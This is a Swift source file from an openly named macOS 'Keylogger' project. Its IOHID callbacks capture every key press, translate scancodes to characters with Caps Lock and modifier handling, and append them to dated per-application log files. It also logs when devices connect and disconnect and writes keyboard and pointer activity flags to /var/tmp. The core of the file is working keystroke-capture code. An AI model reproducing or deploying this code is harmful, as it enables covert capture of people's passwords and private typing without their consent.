//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""

    static let KBD_ACTIVITY_FILE_PATH = "/var/tmp/leash.client.KbdActivityTest" // /var/tmp/
    static let PTR_ACTIVITY_FILE_PATH = "/var/tmp/leash.client.PtrActivityTest"

    static var timeStampKeyboardLast: Date = Date(timeIntervalSince1970: 0)
    static var timeIntervalKeyboardMax: TimeInterval = 8.0 // Wait 8 seconds before locking
    static var timeStampPointerLast: Date = Date(timeIntervalSince1970: 0)
    static var timeIntervalPointerMax: TimeInterval = 8.0 // Wait 8 seconds before locking

    static var kbdFileValue = false
    static var ptrFileValue = false

    static var timer: Timer?

    // Every 2 seconds
    class func checkKbdPtrActivity() {
        if kbdFileValue == true && -timeStampKeyboardLast.timeIntervalSinceNow > timeIntervalKeyboardMax
        {
            // Do clear. It's been a while .
            changeFileValue(KBD_ACTIVITY_FILE_PATH, false)
            kbdFileValue = false
        }
        if ptrFileValue == true && -timeStampPointerLast.timeIntervalSinceNow > timeIntervalPointerMax
        {
            // Do clear. It's been a while .
            changeFileValue(PTR_ACTIVITY_FILE_PATH, false)
            ptrFileValue = false
        }
    }


    class func updateKbdActivity() {
        if kbdFileValue == false {
            CallBackFunctions.changeFileValue(KBD_ACTIVITY_FILE_PATH, true)
            kbdFileValue = true
        }
        CallBackFunctions.timeStampKeyboardLast = Date()
    }


    class func updatePtrActivity() {
        if ptrFileValue == false {
            CallBackFunctions.changeFileValue(PTR_ACTIVITY_FILE_PATH, true)
             ptrFileValue = true
        }
        CallBackFunctions.timeStampPointerLast = Date()
    }


    class func startActivityCheck () {
        changeFileValue(PTR_ACTIVITY_FILE_PATH, false)
        changeFileValue(KBD_ACTIVITY_FILE_PATH, false)
        kbdFileValue = false
        ptrFileValue = false
        startTimer()
    }

    class func startTimer() {
        let timer = Timer.scheduledTimer(withTimeInterval: 2.0,
                                         repeats: true,
                                         block: { timer in
                                            CallBackFunctions.checkKbdPtrActivity()
        })

        CallBackFunctions.timer = timer
        RunLoop.main.add(timer, forMode: RunLoopMode.commonModes)
    }

    
    static let Handle_IOHIDInputValueCallbackUSRID: IOHIDValueCallback = { context, result, sender, device in
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        var test: Bool
        var isKeyboard = false
        if (IOHIDElementGetUsagePage(elem) == 0x07) {
            isKeyboard = true
        }
        if isKeyboard == true {
            updateKbdActivity()
        } else {
            updatePtrActivity()
        }
    }

    class func changeFileValue(_ filePath: String, _ value: Bool) {
        let URLPathFull = NSURL.fileURL(withPath: filePath)
//        let URLPathDir = NSURL.copy()
//        URLPathDir.deleteLastPathComponent()
        let fileName = URLPathFull.path
//        NSLog("change value in \(fileName) to \(value)")

        if !FileManager.default.fileExists(atPath: fileName )
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File!")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.truncateFile(atOffset: 0)
        let data = Data(bytes: [value ? 1 : 0] )
        fh?.write(data)
        fh?.synchronizeFile()
        fh?.closeFile()
    }


    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        let path = mySelf.devicesData.appendingPathComponent(dateFolder)
        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        
        let fileName = path.appendingPathComponent("Time Stamps").path
        if !FileManager.default.fileExists(atPath: fileName )
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File!")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        let timeStamp = "Connected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
        fh?.write(timeStamp.data(using: .utf8)!)
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
            
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
            let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
            let path = mySelf.devicesData.appendingPathComponent(dateFolder)
            if !FileManager.default.fileExists(atPath: path.path)
            {
                do
                {
                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
                }
                catch
                {
                    print("Can't Create Folder")
                }
            }
            
            let fileName = path.appendingPathComponent("Time Stamps").path
            if !FileManager.default.fileExists(atPath: fileName )
            {
                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
                {
                    print("Can't Create File!")
                }
            }
            let fh = FileHandle.init(forWritingAtPath: fileName)
            fh?.seekToEndOfFile()
            let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
            fh?.write(timeStamp.data(using: .utf8)!)
    }


    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        var test: Bool
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );
        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        var path = mySelf.keyData.appendingPathComponent(dateFolder)
        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        let fileName = path.appendingPathComponent(mySelf.appName).path
        if CallBackFunctions.prev == fileName
        {
            test = false
        }
        else
        {
            test = true
            CallBackFunctions.prev = fileName
        }
        if !FileManager.default.fileExists(atPath: fileName)
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        if test
        {
            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
            fh?.write(timeStamp.data(using: .utf8)!)
        }
Outside:if pressed == 1
        {
            if scancode == 57
            {
                CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                break Outside
            }
            if scancode >= 224 && scancode <= 231
            {
                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                break Outside
            }
            if CallBackFunctions.CAPSLOCK
            {
                fh?.write(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
            }
            else
            {
                fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
            }
        }
        else
        {
            if scancode >= 224 && scancode <= 231
            {
                fh?.write(")".data(using: .utf8)!)
            }
        }
    }

    //    (void *context, IOReturn result, void *sender, IOHIDReportType type, uint32_t reportID, uint8_t *report, CFIndex reportLength);
//    static let Handle_IOHIDInputReportCallback: IOHIDReportCallback = { context, result, sender, type, reportID, report, reportLength in
//        NSLog("report: \(report)")
//    }


}
